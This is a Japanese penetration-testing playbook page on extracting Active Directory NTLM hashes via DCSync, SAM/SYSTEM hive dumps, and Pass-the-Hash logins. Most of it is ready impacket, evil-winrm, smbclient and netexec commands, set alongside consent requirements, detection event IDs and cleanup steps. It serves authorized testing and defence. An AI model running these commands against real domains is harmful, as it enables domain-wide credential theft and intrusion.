# 認証情報のダンプ（DCSync / Pass-The-Hash）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [x] 持続化に該当（取得した krbtgt ハッシュは Golden Ticket に直結）
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（Event ID 4662 + DRSUAPI レプリケーションコール、LSASS dump は Defender for Endpoint 等で確実に検知）
>
> 実施可否は事前合意で明示確認すること。取得情報の暗号化保管・案件後破棄ポリシーが必須。演習環境（HTB / OSCP 等）では制約なし。

## 概要

Domain Admin 相当の権限または DCSync 権限を取得した後に、ドメイン内の全アカウントの NTLM ハッシュを取得する手法。取得したハッシュは Pass-The-Hash でそのまま認証に使用できる。

---

## DCSync による全ハッシュの取得

### 着火条件

以下のいずれかで DCSync 権限がある場合：
- Domain Admins メンバー
- `DS-Replication-Get-Changes` と `DS-Replication-Get-Changes-All` 権限を持つ
- Kerberos チケット（RBCD / Unconstrained Delegation で取得した DC$ の TGT）

### 手順

**パスワード認証で実行：**
```bash
impacket-secretsdump \
  -just-dc-ntlm \
  '[DOMAIN]/[USER]:[PASSWORD]@[DC_FQDN]'
```

**NTLM ハッシュで実行（Pass-The-Hash）：**
```bash
impacket-secretsdump \
  -hashes :[NTLM_HASH] \
  -just-dc-ntlm \
  '[DOMAIN]/Administrator@[DC_FQDN]'
```

**Kerberos チケットで実行：**
```bash
export KRB5CCNAME=/path/to/ticket.ccache

impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  -target-ip [DC_IP] \
  'administrator@[DC_FQDN]'
```

### 出力の読み方

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
[USER]:1104:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
```

- フィールド順: `ユーザー名:RID:LMハッシュ:NTLMハッシュ`
- `aad3b435b51404eeaad3b435b51404ee` は空の LM ハッシュ（現代の環境では常にこれ）
- **NTLM ハッシュ部分（4番目のフィールド）** を使用する

---

## Pass-The-Hash によるアクセス

NTLM ハッシュをパスワードの代わりにそのまま使用する。

### WinRM（evil-winrm）

```bash
evil-winrm -i [DC_IP] -u Administrator -H '[NTLM_HASH]'
```

### SMB（smbclient）

```bash
smbclient //[DC_IP]/C$ -U '[DOMAIN]\Administrator' --pw-nt-hash '[NTLM_HASH]'
```

### SMB（impacket）

```bash
impacket-smbexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
impacket-psexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
impacket-wmiexec -hashes :[NTLM_HASH] '[DOMAIN]/Administrator@[DC_IP]'
```

### 確認（NetExec）

```bash
netexec smb [DC_IP] -u Administrator -H '[NTLM_HASH]'
# [+] ... (Pwn3d!) が出れば成功
```

---

## ローカルの SAM / SYSTEM ハイブからのハッシュ取得

（Domain Controller 以外のメンバーサーバーやワークステーションの場合）

```bash
# レジストリからSAMとSYSTEMをバックアップ
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive

# 攻撃側マシンにダウンロード後
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## 注意点・落とし穴

- `-just-dc-ntlm` を付けないと NTDS.dit の全内容（非常に大量）が出力される
- 出力は必ずファイルにリダイレクトして保存しておく
- krbtgt ハッシュは Golden Ticket 攻撃で使用できるため必ず保存する

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。DCSync はドメイン全体の認証情報取得に直結する最重要操作
- **想定されるSIEM/EDR検知**:
  - Event ID 4662（オブジェクトへのアクセス）+ DRSUAPI のレプリケーション RPC 呼び出し
  - Microsoft ATA/Defender for Identity の DCSync アラート（`DS-Replication-Get-Changes-All` 権限行使を検知）
  - LSASS プロセスへのアクセス → Defender for Endpoint / EDR の挙動検知
  - Pass-The-Hash 利用は Event ID 4624 Type 3（NTLM）で検知
  - **Sysmon Event ID 10（ProcessAccess to lsass.exe）**: procdump / Mimikatz がLSASSにアクセスする際に記録。GrantedAccess `0x1010` / `0x1410` / `0x143A` などが SIEM 検知クエリの対象となる。`impacket-secretsdump` のリモート実行では DRSUAPI 経由のため Event ID 4662 が主になる
  - **Sysmon Event ID 8（CreateRemoteThread）**: ソースプロセスからターゲット `lsass.exe` へのスレッド作成。Mimikatz の一部モードで発生
  - **EDR アラート名（例）**: Defender for Endpoint「Credential dumping」、CrowdStrike「OS Credential Dumping: LSASS Memory」、SentinelOne「Credential Access: LSASS Memory Access」
- **業務影響リスク**: なし（参照のみで業務影響は出ないが、ダンプ操作自体が高優先度のインシデントとして扱われる）
- **原状回復必須項目**:
  - ✅ DCSync 用に付与した複製権限（`DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All`）の削除
  - ✅ ダンプしたハッシュファイル・SAM/SYSTEM ハイブの暗号化保管 → 案件終了時破棄
  - ✅ krbtgt 取得時はクライアントへ「krbtgt パスワードの2回ローテーション」を依頼
  - ✅ レジストリエクスポート時に作成した一時ファイル（`C:\Temp\sam.hive` 等）の削除
- **取得情報の取扱**: 全 NTLM ハッシュ・krbtgt ハッシュは暗号化保管、アクセスログ管理、案件終了時破棄。クライアントとの契約書面での合意必須
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 昇格成功後に確認すること（横展開観点）

**「DCSync で krbtgt を取得できた = ゴール」ではない。** ドメイン全体のハッシュを取得した時点で以下を確認し、横展開・証跡収集・業務影響評価を行う。

- **krbtgt ハッシュ** → Golden Ticket 作成可能（事前合意がない限り原則作成しない）。取得した時点でクライアントへ「krbtgt パスワードの2回ローテーション」を依頼する案件報告事項を確定
- **Domain Admin / Enterprise Admin の NTLM ハッシュ** → Pass-The-Hash でドメイン内任意ホストへ接続性確認（業務影響を避けるため非業務時間帯に行う）
- **全ユーザーの NTLM ハッシュ** → hashcat でクラック → パスワード強度・使い回し状況の評価レポート用途
- **サービスアカウントの NTLM ハッシュ** → SPN 付きアカウント・Linux 側 sssd 連携アカウントへの横展開
- **マシンアカウントのハッシュ** → そのホストでのローカル管理者操作・Silver Ticket 作成可否
- **SAM/LSA dump（メンバーサーバー側）取得時** → ローカル管理者ハッシュ → ドメイン内他ホストへの Pass-The-Hash 試行（同一ローカル管理者パスワード使い回し検出）
- **保存資格情報（DPAPI / Credential Manager / RDP マネージャー）** → クラウド・SaaS・サードパーティへの横展開経路
- **Kerberos チケットキャッシュ（lsass/ccache）** → 残存チケットによる権限借用
- **LAPS の `ms-Mcs-AdmPwd` 属性** → 各ホストのローカル管理者パスワード（DCSync 後は読み取り権限を実質持つ）

---

## 関連技術
- 前：RBCD で Admin TGS を取得 → `./Delegation_Attacks/RBCD.md`
- 前：Unconstrained Delegation で DC$ TGT を取得 → `./Delegation_Attacks/Unconstrained.md`
- 後：取得したチケットの使用方法 → `./Kerberos_Attacks/Pass_The_Ticket.md`
- 後：取得したハッシュ・パスワードの使い回し確認 → `../02_Initial_Access/Credential_Discovery.md`
- 後：ハッシュクラック → `../05_Tools_Reference/Hashcat.md`
- 後：LAPS 値の取得 → `./LAPS_Dump.md`
